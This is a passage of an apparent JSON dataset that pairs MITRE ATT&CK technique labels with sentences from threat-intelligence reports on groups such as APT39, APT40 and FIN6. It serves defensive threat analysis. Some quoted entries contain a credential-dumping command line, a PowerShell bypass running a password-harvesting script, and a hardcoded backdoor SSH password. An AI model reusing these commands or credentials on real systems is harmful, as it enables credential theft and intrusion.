    "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)."
  ],
  "software discovery: security software discovery": [
    "A 2016 Novetta report detailed the work of security vendors attempting to unveil tools and infrastructure related to the 2014 destructive attack against Sony Pictures Entertainment",
    "Detecting Avast\u00a0 A unique feature of this latest Astaroth Trojan campaign is the malware's ability to search for specific security products and exploit them",
    "The analysis of the tools and techniques used in the Astaroth campaign show how truly effective LOLbins are at evading antivirus products",
    "Tools CTU researchers observed BRONZE UNION using the following tools in intrusions since the 2015 analysis, but clients should assume that the threat group still has access to the previously reported tools",
    "Organizations that Buckeye targeted over time, per region Malware and tools Buckeye uses a number of hacking tools as well as malware",
    "In doing so, it will attempt to detect the following Anti-Virus products via various techniques:  Trend Micro Kaspersky Symantec Avira AVG ALYac Ahnlab  Ahnlab and ALYac are the most widely used Anti-Virus solutions in South Korea, and Trend Micro and the rest are also known to be most widely used in Taiwan",
    "When combined with email tracking software, APT32 was able to closely track phishing delivery, success rate, and conduct further analysis about victim organizations while monitoring the interest of security firms",
    "This group was observed using tactics such as registering typosquatting domains for security or technology vendors, abusing open-source penetration testing tools, and leveraging novel file types as anti-analysis techniques",
    "APT12 closely monitors online media related to its tools and operations and reacts when its tools are publicly disclosed",
    "Types of attacks possibly averted include Structured Query Language (SQL) injection, cross-site scripting, and command injection.Use stringent file reputation settings \u2013 Tune the file reputation systems of your anti-virus software to the most aggressive setting possible",
    "Keep security software up-to-date with the latest definitions  Protection Norton Security, Symantec Endpoint Protection, and other Symantec security products protect users against these threats through the following detections: AV  Backdoor.Cadelspy Backdoor.Remexi Backdoor.Remexi.B  IPS  System Infected: Backdoor.Cadelspy Activity 2 System Infected: Backdoor.Remexi Activity  Indicators of compromise We have also compiled an indicators-of-compromise document containing further details which can be used to help identify the threats if they are present in your environment",
    "We would like to thank White-Hat, Tom Lancaster\u00a0of Palo Alto Networks, Michael Yip of Stroz Friedberg, security researcher Marcus, and other security researchers and organizations who shared information and provided feedback",
    "In addition to obfuscation techniques, it also has the ability to detect security tools on the analysis machine, and can also shut down the system if it detects the presence of such tools",
    "Checks for the presence of security tools (detailed in the Appendix) and if any of these security tools are discovered, then the system will be shut down, as shown in Figure 14",
    "Figure 14: System shut down upon discovery of security tools  Ability to receive PowerShell script from the C2 server and execute on the machine",
    "Additionally it checks to determine if common analysis tools are currently running on the infected system",
    "Given the regional file format used there is a chance that some security software suites may not handle them well, and this may have provided an evasion case for the attacker.The documents sent to the targets were titled \"Analysis of \"Northern New Year in 2017\" and used the official logo of the Korean Ministry of Unification",
    "Smart, optimized, and connected, XGen security powers Trend Micro\u2019s suite of security solutions: Hybrid Cloud Security, User Protection, and Network Defense",
    "Link analysis of infrastructure and tools also revealed a potential relationship between Magic Hound and the adversary group called \u201cRocket Kitten\u201d (AKA Operation Saffron Rose, Ajax Security Team, Operation Woolen-Goldfish) as well as an older attack campaign called Newscasters",
    "As seen below, the relational analysis proved to be quite fruitful:  Figure 1 Overview of relationships We rapidly discovered a different set of tools communicating to the exact same C2 servers as those two Word documents, in addition to other tools communicating to other subdomain variations of chrome-up[.]date as seen in the following graphic:  Figure 2 Command and control overlaps From there, we were able to map out a large infrastructure separating out into four categories of tools: downloaders, droppers, loaders, and payloads",
    "The toolset used by the Magic Hound campaign was an assortment of custom tools, as well as open sourced tools available to the general public",
    "They are known for \u201cliving off the land,\u201d meaning they use already available tools and software installed on the computer to operate, and once inside a target network, they will tailor their malware specifically to the target",
    "Traditional antivirus software and other systems that rely on low-level indicators do not effectively detect and block common and pervasive malware",
    "End users can benefit from security solutions such as\u00a0Trend Micro Home Security for Mac, which provides comprehensive security and multi-device protection against cyberthreats",
    "Enterprises can benefit from Trend Micro\u2019s\u00a0Smart Protection Suites\u00a0with XGen security, which infuses high-fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across any user activity and any endpoint",
    "As we discover new tools used by this group, we have consistently discovered overlapping artifacts with previously used tools and infrastructure",
    "Mitigation Security and system/IT administrators must practice due diligence in protecting their websites and web-based applications from threats that can undermine their security, and hijack them to do the bad guys\u2019 bidding\u2014delivering malware to their victims",
    "Network Security appliances such as NGFW, NGIPS, and Meraki MX can detect malicious activity associated with this threat",
    "AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products",
    "Mitigation As this sample installs itself through the use of EternalBlue, the targeted protocol is SMB.\u00a0 Because of this, in order to best mitigate and avoid possible installations, you need your system updated to the latest security patches.\u00a0 Specifically, you\u2019d want to make sure that you have MS17-010 installed, as this is the security patch that patches the EternalBlue vulnerability",
    "The malware queries the value for the flag BeingDebugged from PEB to check whether the process is being debugged. ",
    "",
    "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS) For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the <code>DescribeSecurityGroups</code> action with various request parameters. (Citation: DescribeSecurityGroups - Amazon Elastic Compute Cloud)"
  ],
  "data from local system": [
    "APT38 is characterized by long planning, extended periods of access to compromised victim environments preceding any attempts to steal money, fluency across mixed operating system environments, the use of custom developed tools, and a constant effort to thwart investigations capped with a willingness to completely destroy compromised machines afterwards",
    "The RIPTIDE exploit document drops its executable file into the C:\\Documents and Settings\\{user}\\Application Data\\Location folder while the HIGHTIDE exploit document drops its executable file into the C:\\DOCUMENTS and SETTINGS\\{user}\\LOCAL SETTINGS\\Temp\\ folder",
    "In many payment card data breaches, a point-of-sale (POS) system is infected with malware that searches for specific processes in memory known to store card data in plain text",
    "Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites."
  ],
  "remote desktop protocol remote services-multi": {
    "technique_names": [
      "remote services: remote desktop protocol",
      "remote services"
    ],
    "sentances": [
      "Lateral Movement, Maintain Presence, and Complete Mission APT39 facilitates lateral movement through myriad tools such as Remote Desktop Protocol (RDP), Secure Shell (SSH), PsExec, RemCom, and xCmdSvc"
    ]
  },
  "proxy": [
    "Custom tools such as REDTRIP, PINKTRIP, and BLUETRIP have also been used to create SOCKS5 proxies between infected hosts",
    "[9] \u201cHKU concern group raises proxy fears in key vote.\u201d EIJ Insight",
    "In green, functions from Keychaindump C&C communication Keydnap is using the onion.to Tor2Web proxy over HTTPS to report back to its C&C server",
    "This can be complemented by restricting direct internet access to the company\u2019s internal networks while using proxies to access external resources",
    "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic."
  ],
  "remote services: remote desktop protocol": [
    "In addition to using RDP for lateral movement, APT39 has used this protocol to maintain persistence in a victim environment",
    "Lateral Movement APT40 uses many methods for lateral movement throughout an environment, including custom scripts, web shells, a variety of tunnelers, as well as Remote Desktop Protocol (RDP)",
    "Containment provided by enclaving also makes incident cleanup significantly less costly.Configure firewalls to disallow Remote Desktop Protocol (RDP) traffic coming from outside of the network boundary, except for in specific configurations such as when tunneled through a secondary virtual private network (VPN) with lower privileges.Audit existing firewall rules and close all ports that are not explicitly needed for business",
    "",
    "Following the compromise of this system, analysts identified FIN6 leveraged stolen credentials to move laterally within the environment using the Windows\u2019 Remote Desktop Protocol (RDP).",
    "FIN6 used another set of compromised credentials with membership to additional groups in the domain to RDP to other hosts",
    "FIN6 also moved laterally to servers in the environment using RDP and configured them as malware \u201cdistribution\u201d servers.",
    "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware)"
  ],
  "archive collected data": [
    "To complete its mission, APT39 typically archives stolen data with compression tools such as WinRAR or 7-Zip",
    "APT40 has been observed consolidating files acquired from victim networks and using the archival tool rar.exe to compress and encrypt the data before exfiltration",
    "This crafted zip archive exploited a WinRAR flaw that makes files in zip archives appear to have a different name and file extension",
    "On September 24, 2018, we observed an organization targeted by OilRig attempting to download a Zip archive from the following URL: hxxp://193.111.152[.]13/[redacted]-ITsoftwareUpdate.zip This Zip archive contained a file named [redacted]-ITsoftwareUpdate.exe (SHA256: 5f42deb792d8d6f347c58ddbf634a673b3e870ed9977fdd88760e38088cd7336), which is a variant of the OopsIE Trojan we described in detail in a blog we published in September 2018",
    "RARM Creates RAR files per logical drive containing data with timestamps for the past 30 days, then uploads RAR to the C2 server using a POST command at the path \u201c/FeedBack.php\u201d",
    "RARW Creates RAR files per logical drive containing data with timestamps for the past 7 days, then uploads RAR to the C2 server using a POST command at the path \u201c/FeedBack.php\u201d",
    "When exfiltrating the keychain, the keychain field is used instead of data",
    "Each of the emails had a password protected RAR archive attached named credential.rar",
    "Sometimes it is a high profile, legitimate site such as \u201cdiplomacy.pl\u201d, hosting a ZIP archive",
    "The ZIP archive contains a RAR SFX which installs the malware and shows an empty PDF decoy",
    "The entire command structure gets compressed with zlib and then encrypted using a custom stream cipher.",
    "",
    "The results are Gzipped and saved under random file in the temp folder.",
    "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method."
  ],
  "file deletion software packing-multi": {
    "technique_names": [
      "indicator removal on host: file deletion",
      "obfuscated files or information: software packing"
    ],
    "sentances": [
      "Figure 2: APT39 attack lifecycle There are some indications that APT39 demonstrated a penchant for operational security to bypass detection efforts by network defenders, including the use of a modified version of Mimikatz that was repacked to thwart anti-virus detection in one case, as well as another instance when after gaining initial access APT39 performed credential harvesting outside of a compromised entity's environment to avoid detection"
    ]
  },
  "credential dumping exploitation for privilege escalation-multi": {
    "technique_names": [
      "os credential dumping",
      "exploitation for privilege escalation"
    ],
    "sentances": [
      "Escalate Privileges APT40 uses a mix of custom and publicly available credential harvesting tools to escalate privileges and dump password hashes",
      "In one incident, the threat actor used the Wrapikatz tool (w.exe) with a usage statement that retrieves various passwords and Windows credentials from memory and compiles them in w.txt: c:\\programdata\\w.exe \u2013w \u2013l \u2013c>>c:\\programdata\\w.txt In a separate incident, the threat actor used access provided by extensive web shell deployment to harvest account credentials:  2016-10-03T09:27:47   dir 2016-10-03T09:28:11   w64.log >ppp.log 2016-10-03T09:30:10     PowerShell.exe -ExecutionPolicy Bypass -File getpwd.ps1 >iistail.log  In another example, BRONZE UNION leveraged the Kekeo credential abuse tool to exploit CVE-2014-6324, a vulnerability in Microsoft's implementation of the Kerberos network authentication protocol"
    ]
  },
  "remote services": [
    "Internal Reconnaissance APT40 uses compromised credentials to log on to other connected systems and conduct reconnaissance",
    "Figure 4 \u2013 Backdoored authentication function in SSH server As you can see in Figure 4, this version of Dropbear SSH will authenticate the user if the password passDs5Bu9Te7 was entered",
    "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)\n\nLegitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands)"
  ],
  "brute force": [
    "APT40 also uses publicly available brute-forcing tools and a custom utility called DISHCLOTH to attack different protocols and services",
    "During our initial research into the TwoFace++ loader, we were unable to extract the embedded payload using the same brute forcing technique that we used on the initial TwoFace loader samples",
    "We were able to brute force the actor-provided key using the inverse arithmetic operations using the embedded salt and embedded ciphertext, so we were able to extract the embedded webshells with ease",
    "It then takes note of the infected machine\u2019s IP address, user, domain, hostname, OS and Service Pack, and the username and password combination that worked during the brute force routine",
    "Its main functions are:  Brute-force using a pre-defined list of usernames and passwords in an attempt to login to Admin panels",
    "TG-3390 attempts to reenter the environment by identifying accounts that do not require two-factor authentication for remote access solutions, and then brute forcing usernames and passwords",
    "Several of the tools are freely-available Windows utilities, such as Amplia Security\u2019s Windows Credential Editor. We also found a nearly complete set of the Microsoft SysInternals  PsTools package, a copy of NLBrute (which attempts to brute-force passwords), installers for the commercial TeamViewer and AnyDesk remote support tools, and a number of utilities created by endpoint security vendors that are designed to remove their (and other companies\u2019) endpoint security and antivirus tools from a computer.",
    "We found a brute-force tool called NLBrute , with configuration files that tell us it had been set up to use an included set of username and passwords to try to break in to machines that have Remote Desktop enabled",
    "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access."
  ],
  "non-standard port": [
    "The malware proceeds to connect to the C2 server at 5.189.145.248 at regular intervals through the use of TCP over port 10500",
    "1/12/14 3/5/14 127.0.0.1 N/A   3/5/14 3/31/14 103.24.0.142 Hong Kong   3/31/14 10/27/14 103.24.1.54 Hong Kong   10/27/14 11/9/14 127.0.0.1 N/A   11/9/14 5/25/15 127.0.0.3 N/A   5/25/15 Current as of this publication 127.0.0.1 N/A    Table 5",
    "Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data."
  ],
  "exploitation for privilege escalation exploitation for client execution-multi": {
    "technique_names": [
      "exploitation for privilege escalation",
      "exploitation for client execution"
    ],
    "sentances": [
      "Exploit Analysis  Despite being an older vulnerability, many threat actors continue to leverage CVE-2012-0158 to exploit Microsoft Word",
      "Unpacking routine for SWF exploit The exploit is a memory corruption vulnerability that exists in the \u201ccom.adobe.tvsdk.mediacore.BufferControlParameters\u201d class.\u00a0 If the exploit is successful, it will gain arbitrary read / write operations within memory, thus allowing it to execute a second stage shellcode",
      "Buckeye has been known to exploit zero-day vulnerabilities in the past, such as CVE-2010-3962 in an campaign in 2010 and CVE-2014-1776 in 2014",
      "These vulnerabilities include:CVE-2015-6585: Hangul Word Processor VulnerabilityCVE-2015-8651: Adobe Flash Player 18.0.0.324 and 19.x VulnerabilityCVE-2016-0034: Microsoft Silverlight 5.1.41212.0 VulnerabilityCVE-2016-1019: Adobe Flash Player 21.0.0.197 VulnerabilityCVE-2016-4117: Adobe Flash Player 21.0.0.226 VulnerabilityDHS recommends that organizations upgrade these applications to the latest version and patch level",
      "During the past few months, APT34 has been able to quickly incorporate exploits for at least two publicly vulnerabilities (CVE-2017-0199 and CVE-2017-11882) to target organizations in the Middle East",
      "Since Operation Clandestine Fox, we have observed this actor execute multiple attacks that did not rely on zero-day exploits.\u00a0The combination of this sustained operational tempo and lack of zero-day exploits may indicate that this group has changed strategy and has decided to attack more frequently and does not have steady access to zero-day exploit code.\u00a0No matter the strategy, this actor has shown an ability to operate successfully",
      "In particular, the threat actors have exploited CVE-2011-3544, a vulnerability in the Java Runtime Environment, to deliver the HttpBrowser backdoor; and CVE-2010-0738, a vulnerability in JBoss, to compromise internally and externally accessible assets used to redirect users' web browsers to exploit code"
    ]
  },
  "modify registry registry run keys / startup folder-multi": {
    "technique_names": [
      "modify registry",
      "boot or logon autostart execution: registry run keys / startup folder"
    ],
    "sentances": [
      "If the mutex does not exist and a Windows Startup Registry key with name \u201cSystem Update\u201d does not exist, the malware performs its initialization routine by:  Copying itself to the path %PROGRAMDATA%\\svchost.exe Sets the Windows Startup Registry key with the name \u201cSystem Update\u201d which points to the above dropped payload"
    ]
  },
  "security software discovery system information discovery-multi": {
    "technique_names": [
      "software discovery: security software discovery",
      "system information discovery"
    ],
    "sentances": [
      "It was also able to use a component of multinational antivirus software Avast to gain information about the target system, as well as a process belonging to Brazilian information security company GAS Tecnologia to gather personal information"
    ]
  },
  "process injection": [
    "This version\u00a0injects a malicious module into one of\u00a0Avast's processes, whereas early versions of the campaign detected Avast and quit",
    "On execution, the tool injects itself into lsass.exe and is triggered with the argument \u201cdig\u201d",
    "Figure 5 shows Phishery\u2019s output to the command that injects a URL into a file named \u201cgood_test.docx\u201d, which it will save the resulting file to \u201cbad_test.docx\u201d",
    "It is capable of the following functions:  Collect file/folder/drive information Download files and additional malware Launch/terminate/enumerate process Update configuration data Delete files Inject code from files to other running process Utilize proxy Open reverse shell Run in passive mode \u2014 instead of actively connecting to the command and control (C&C) server, the backdoor will open and listen to a port then receive commands through it  Once the backdoor is loaded, it will then load the encrypted configuration file Auditcred.dll.mui/rOptimizer.dll.mui to extract the C&C information and connect to it",
    "As a result of all these steps, the last-stage Trojan is injected into svchost.exe\u2019s process memory",
    "Process injection helps the malware avoid detection; however, review of active network connections show notepad.exe communicating to 185",
    "This shellcode injects the final payload taken from the resource section into the original RegAsm.exe process",
    "Traps\u00a04.0 can be configured to protect the processes that are cited as being abused in this blog from loading malicious code",
    "Injects ma32.dll into \u201cwwahost.exe\u201d or \u201caudacity.exe\u201d",
    "05 27 28 obj32.bin obj32.bin obj64.bin Shellcode template is used by Reinstaller/Injector (rsXX.dll) and AudioRecorder4MetroApp (meXX.dll) for injecting into running processes",
    "Pupy can communicate using multiple transports, migrate into processes using reflective injection, and load remote python code, python packages and python C-extensions from memory",
    "Meanwhile, injection and delivery techniques are undergoing changes in 2018 with reflective loaders and code enhancements",
    "2e0361fd73f60c76c69806205307ccac, update.dll (MiniDuke), 425kb (internal name = \u201cUserCache.dll\u201c) 9e3f3b5e9ece79102d257e8cf982e09e, cache.dll (CozyDuke), 425kb (internal name = \u201cUserCache.dll\u201c) The two share identical export function names in their export directories, and the naming appears to be randomly assigned at compile time",
    "*Command_Create&Inject:\u00a0 This command creates a new process (using a supplied filename as the process name) and then injects malicious code into it",
    "64)   u= {B5B70BD7-87FC-499A-B4D1- 98163306F0D8} A GUID   r= 1 Boolean value if the malware is running as injected code   t= 8035187 Number of milliseconds the computer has been running    Table 3",
    "The loader will then inject a DLL backdoor into dllhost.exe",
    "FakeRun\u2019s PDB string (D:\\Work\\Project\\VS\\house\\Apple\\Apple_20180115\\Release\\FakeRun.pdb) indicates the loader will execute dllhost.exe and inject one malicious DLL file, which is the backdoor, into this process",
    "TClient is injected into dllhost.exe Malware Analysis\u00a0 wab32res.dll (FakeRun loader) loads TClient",
    "Successfully checking the loader will execute the dllhost.exe process and create a hardcode mutex to avoid injecting it into the wrong dllhost.exe, as there can be multiple instances of it depending on the number of programs using the Internet Information Services",
    "20 New processes The malicious svchost constantly queries ieframe.dll, as well as IWebBrowser2 Interface using CLSID dc30c1661-cdaf-11D0-8A3E-00c04fc9e26e, both key components to interact with Internet Explorer",
    "Figure 2: De-obfuscated code scheduling the second task to run a script embedded in a blog page The last section of script embedded in 29[.]html then downloads Revenge RAT and injects the binary into the memory of a running process, as seen in Figure 3",
    "The encoded payload was a Cobalt Strike httpsstager that was injected into the PowerShell process that ran the command",
    "After finding the process id, the shellcode uses standard functions to allocate and write memory within Explorer and then uses low-level API RtlCreateUserThread for thread injection.",
    "It\u2019s also used to inject code into its target processes using the technique.",
    "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. "
  ],
  "shortcut modification remote file copy-multi": {
    "technique_names": [
      "boot or logon autostart execution: shortcut modification",
      "ingress tool transfer"
    ],
    "sentances": [
      "The downloaded .7zip file contains a .lnk file that, once pressed, initializes the malware"
    ]
  },
  "timestomp shortcut modification-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "boot or logon autostart execution: shortcut modification"
    ],
    "sentances": [
      "An obfuscated command is located inside the Target bar in the .lnk file properties.\u00a0  Hidden command inside the .lnk file"
    ]
  },
  "shortcut modification obfuscated files or information-multi": {
    "technique_names": [
      "boot or logon autostart execution: shortcut modification",
      "obfuscated files or information"
    ],
    "sentances": ["The full obfuscated command inside the .lnk file"]
  },
  "windows management instrumentation": [
    "wmic.exe is a powerful, native Windows command line utility used to interact with Windows Management Instrumentation (WMI)",
    "This utility is able to execute complicated WQL queries and WMI methods",
    "Instead of using systeminfo and tasklist commands, the C# variant of Zebrocy uses WMI queries to gather this information",
    "POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI)",
    "POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI",
    "Windows Management Instrumentation WMI is an administrative framework that is built into every version of Windows since 2000",
    "WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell",
    "Windows system WMI data is stored in the WMI common information model (CIM) repository, which consists of several files in the System32\\wbem\\Repository directory",
    "WMI classes are the primary structure within WMI",
    "WMI permanent event subscriptions can be used to trigger actions when specified conditions are met",
    "Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding",
    "WMI Filters define conditions that will trigger a Consumer, including system startup, the execution of a program, the passing of a specified time and many others",
    "APT29 then created a WMI event subscription in order to execute the backdoor",
    "In one instance, APT29 created a Filter named BfeOnServiceStartTypeChange (Figure 1), which they configured to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time.\u00a0    Figure 1: \u201cBfeOnServiceStartTypeChange\u201d WMI Query Language (WQL) filter condition The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration",
    "This excellent whitepaper by William Ballenthin, Matt Graeber and Claudiu Teodorescu contains additional information on WMI offense, defense and forensics",
    "This presentation by Christopher Glyer and Devon Kerr contains additional information on attacker use of WMI in past Mandiant investigations",
    "The FireEye FLARE team released a WMI repository-parsing tool that allows investigators to extract embedded data from the WMI repository and identify WMI persistence.",
    "Initial triage begins with connecting to Windows Management Instrumentation (WMI) via the \u201cROOT\\CIMV2\u201d namespace",
    "The payload uses WMI queries and checks running processes for evidence that the script may be executing within an analysis environment",
    "Technique Description   Fan Check The Trojan will perform the following WMI query: \u00a0 Select * from Win32_Fan \u00a0 According to MSDN, this query should return a class that provides statistics on the CPU fan",
    "This suggests that other WMI-based VM detection techniques may also detect certain physical systems if those systems do not support the specific WMI query",
    "Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality",
    "Leveraging Existing Windows Services to Deliver Malware Windows Management Instrumentation Console (WMIC) provides a command line interface to WMI",
    "WMIC is a good tool for managing windows hosts and is widely favored by desktop administrators",
    "This is attack vector presents interesting problems, as blocking or restricting the use of WMIC may not be a feasible solution for some administrators",
    "Most of the PowerShell commands would call Windows Management Instrumentation (WMI)",
    "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM).(Citation: MSDN WMI) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: MSDN WMI)(Citation: FireEye WMI 2015)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)"
  ],
  "exfiltration over c2 channel": [
    "This location data gives the attacker a unique edge, as they can specify a target country or city to attack and maximize their accuracy when choosing a particular target.\u00a0  \u00a0The .txt file contains information about the C2 domain and infected machine, as detected in a Cybereason Lab environment",
    "Malware  Capabilities  WINDSHIELD   Command and control (C2) communications via TCP raw sockets Four configured C2s and six configured ports \u2013 randomly-chosen C2/port for communications Registry manipulation Get the current module's file name Gather system information including registry values, user name, computer name, and current code page File system interaction including directory creation, file deletion, reading, and writing files Load additional modules and execute code Terminate processes Anti-disassembly   KOMPROGO   Fully-featured backdoor capable of process, file, and registry management Creating a reverse shell File transfers Running WMI queries Retrieving information about the infected system   SOUNDBITE   C2 communications via DNS Process creation File upload Shell command execution File and directory enumeration/manipulation Window enumeration Registry manipulation System information gathering   PHOREAL   C2 communications via ICMP Reverse shell creation Filesystem manipulation Registry manipulation Process creation File upload   BEACON (Cobalt Strike)   Publicly available payload that can inject and execute arbitrary code into processes Impersonating the security context of users Importing Kerberos tickets Uploading and downloading files Executing shell commands Configured with malleable C2 profiles to blend in with normal network traffic Co-deployment and interoperability with Metasploit framework SMB Named Pipe in-memory backdoor payload that enables peer-to-peer C2 and pivoting over SMB    Table 3: APT32 Malware and Capabilities APT32 operators appear to be well-resourced and supported as they use a large set of domains and IP addresses as command and control infrastructure",
    "The malware performs the following activities:  Builds imports by dynamically loading APIs Decrypts strings needed for control server communications Performs control server communications Handles commands issued by the control server Uninstalls self from the system  The malicious thread dynamically loads the APIs it needs at the beginning of its execution using LoadLibrary() and GetProcAddress()",
    "In response, if the status is OK, then a TOKEN is received from the C2 server that is used to synchronize the activities between the victim\u2019s machine and the C2 server",
